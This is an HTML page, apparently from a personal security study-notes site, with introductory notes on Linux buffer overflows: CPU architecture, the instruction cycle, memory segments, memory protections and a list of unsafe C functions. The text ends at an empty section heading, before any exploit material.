@@ -1,0 +1,1113 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Hashcat" href="../../hashcat/hashcat.html" /><link rel="prev" title="Buffer Overflows" href="../buffer-overflows.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Linux Buffer Overflows - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../academy.html">Academy</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../buffer-overflows.html">Buffer Overflows</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../machines/machines.html">Lab Machines</a><input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../machines/hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../machines/medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/medium/zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../machines/easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../machines/easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <section id="linux-buffer-overflows">
+<h1>Linux Buffer Overflows<a class="headerlink" href="#linux-buffer-overflows" title="Permalink to this heading">#</a></h1>
+<section id="von-neumann-architecture">
+<h2>Von-Neumann architecture:<a class="headerlink" href="#von-neumann-architecture" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Primary memory   - CPU cache &amp; RAM
+Secondary memory - Drives, CD-ROMS, Floppys and stuff
+
+CU   - Control Unit - responsible for io with ram and peripheral devices, interrupt control &amp; monitoring of the entire system
+ALU  - Arythmetic and Logic Unit - responsible for the actual calculations ?? 
+IR   - Instruction Register - the CU contains the IR - this is the list of processor instructions
+IAR  - Instruction Address Register
+ISA  - Instruction Set Architecture - instruction set corresponding to a given proc architecture - e.g. arm x86 and so on ... 
+</pre></div>
+</div>
+</section>
+<section id="instruction-set-architectures-types">
+<h2>Instruction Set Architectures types:<a class="headerlink" href="#instruction-set-architectures-types" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">CISC</span> <span class="o">-</span> <span class="n">Complex</span> <span class="n">Instruction</span> <span class="n">Set</span> <span class="n">Computing</span>
+<span class="n">RISC</span> <span class="o">-</span> <span class="n">Reduced</span> <span class="n">Instruction</span> <span class="n">Set</span> <span class="n">Computing</span>
+<span class="n">VLIW</span> <span class="o">-</span> <span class="n">Very</span> <span class="n">Long</span> <span class="n">Instruction</span> <span class="n">Word</span>
+<span class="n">EPIC</span> <span class="o">-</span> <span class="n">Explicitly</span> <span class="n">Parallel</span> <span class="n">Instruction</span> <span class="n">Computing</span>
+</pre></div>
+</div>
+</section>
+<section id="instruction-cycle">
+<h2>Instruction Cycle:<a class="headerlink" href="#instruction-cycle" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mf">1.</span> <span class="n">FETCH</span>                           <span class="n">The</span> <span class="nb">next</span> <span class="n">address</span> <span class="ow">is</span> <span class="n">read</span> <span class="kn">from</span> <span class="nn">IAR.</span> <span class="n">It</span> <span class="ow">is</span> <span class="n">then</span> <span class="n">loaded</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">Cache</span> <span class="ow">or</span> <span class="n">RAM</span> <span class="n">into</span> <span class="n">the</span> <span class="n">Instruction</span> <span class="n">Register</span> <span class="p">(</span><span class="n">IR</span><span class="p">)</span><span class="o">.</span>
+<span class="mf">2.</span> <span class="n">DECODE</span>                          <span class="n">The</span> <span class="n">instruction</span> <span class="n">decoder</span> <span class="n">converts</span> <span class="n">the</span> <span class="n">instructions</span> <span class="ow">and</span> <span class="n">starts</span> <span class="n">the</span> <span class="n">necessary</span> <span class="n">circuits</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">the</span> <span class="n">instruction</span><span class="o">.</span>
+<span class="mf">3.</span> <span class="n">FETCH</span> <span class="n">OPERANDS</span>                  <span class="n">If</span> <span class="n">further</span> <span class="n">data</span> <span class="n">have</span> <span class="n">to</span> <span class="n">be</span> <span class="n">loaded</span> <span class="k">for</span> <span class="n">execution</span><span class="p">,</span> <span class="n">these</span> <span class="n">are</span> <span class="n">loaded</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">cache</span> <span class="ow">or</span> <span class="n">RAM</span> <span class="n">into</span> <span class="n">the</span> <span class="n">working</span> <span class="n">registers</span><span class="o">.</span>
+<span class="mf">4.</span> <span class="n">EXECUTE</span>                         <span class="n">The</span> <span class="n">instruction</span> <span class="ow">is</span> <span class="n">executed</span><span class="o">.</span> 
+<span class="mf">5.</span> <span class="n">UPDATE</span> <span class="n">INSTRUCTION</span> <span class="n">POINTER</span>      <span class="n">If</span> <span class="n">no</span> <span class="n">jump</span> <span class="n">at</span> <span class="n">EXECUTE</span> <span class="n">phase</span><span class="p">,</span> <span class="n">the</span> <span class="n">IAR</span> <span class="ow">is</span> <span class="n">increased</span> <span class="n">by</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">the</span> <span class="n">instruction</span> <span class="ow">and</span> <span class="n">points</span> <span class="n">to</span> <span class="nb">next</span> <span class="n">machine</span> <span class="n">instruction</span><span class="o">.</span>
+</pre></div>
+</div>
+</section>
+<section id="binary-formats">
+<h2>Binary formats;<a class="headerlink" href="#binary-formats" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ELF</span>  <span class="o">-</span> <span class="n">Executable</span> <span class="o">&amp;</span> <span class="n">Linking</span> <span class="n">Format</span> <span class="o">-</span> <span class="p">(</span><span class="n">Nix</span><span class="p">)</span>
+<span class="n">PE</span>   <span class="o">-</span> <span class="n">Portable</span> <span class="n">Executable</span> <span class="n">Format</span>  <span class="o">-</span> <span class="p">(</span><span class="n">Windows</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="memory-structure">
+<h2>Memory structure:<a class="headerlink" href="#memory-structure" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">stack</span> <span class="o">-</span> <span class="n">grows</span> <span class="n">down</span> <span class="p">(</span><span class="n">like</span> <span class="n">stalactites</span><span class="p">)</span> <span class="o">-</span> <span class="n">LIFO</span> <span class="o">-</span> <span class="n">last</span> <span class="ow">in</span> <span class="n">first</span> <span class="n">out</span> <span class="o">-</span> <span class="k">return</span> <span class="n">address</span><span class="p">,</span> <span class="n">parameters</span><span class="p">,</span> <span class="n">frame</span> <span class="n">pointers</span> 
+<span class="n">heap</span>  <span class="o">-</span> <span class="n">grows</span> <span class="n">up</span> <span class="p">(</span><span class="n">like</span> <span class="n">stalagmites</span><span class="p">)</span> <span class="o">-</span> <span class="n">dynamically</span> <span class="n">allocated</span> <span class="n">program</span> <span class="n">memory</span>
+<span class="o">.</span><span class="n">bss</span>  <span class="o">-</span> <span class="n">statically</span> <span class="n">allocated</span> <span class="n">variables</span> <span class="n">represented</span> <span class="n">exclusively</span> <span class="n">by</span> <span class="mi">0</span> <span class="n">bits</span>
+<span class="o">.</span><span class="n">data</span> <span class="o">-</span> <span class="k">global</span> <span class="ow">and</span> <span class="n">static</span> <span class="n">variables</span> <span class="n">that</span> <span class="n">are</span> <span class="n">explicitly</span> <span class="n">initialized</span> <span class="n">by</span> <span class="n">the</span> <span class="n">program</span><span class="o">.</span>
+<span class="o">.</span><span class="n">text</span> <span class="o">-</span> <span class="n">the</span> <span class="n">actual</span> <span class="n">assembler</span> <span class="n">instructions</span> <span class="n">of</span> <span class="n">the</span> <span class="n">program</span><span class="o">.</span> <span class="n">RO</span>
+</pre></div>
+</div>
+</section>
+<section id="modern-memory-protections">
+<h2>Modern memory protections:<a class="headerlink" href="#modern-memory-protections" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ASLR</span> <span class="o">-</span> <span class="n">Address</span> <span class="n">Space</span> <span class="n">Layout</span> <span class="n">Randomization</span>
+<span class="n">DER</span>  <span class="o">-</span> <span class="n">Data</span> <span class="n">Execution</span> <span class="n">Prevention</span> <span class="o">-</span> <span class="n">marks</span> <span class="n">some</span> <span class="n">addresses</span> <span class="k">as</span> <span class="n">non</span> <span class="n">exec</span>
+</pre></div>
+</div>
+</section>
+<section id="vulnerable-c-functions">
+<h2>Vulnerable C Functions<a class="headerlink" href="#vulnerable-c-functions" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">strcpy</span>
+<span class="n">gets</span>
+<span class="n">sprintf</span>
+<span class="n">scanf</span>
+<span class="n">strcat</span>
+</pre></div>
+</div>
+</section>
+<section id="intel-flavor-anatomy">
+<h2>Intel flavor Anatomy<a class="headerlink" href="#intel-flavor-anatomy" title="Permalink to this heading">#</a></h2>
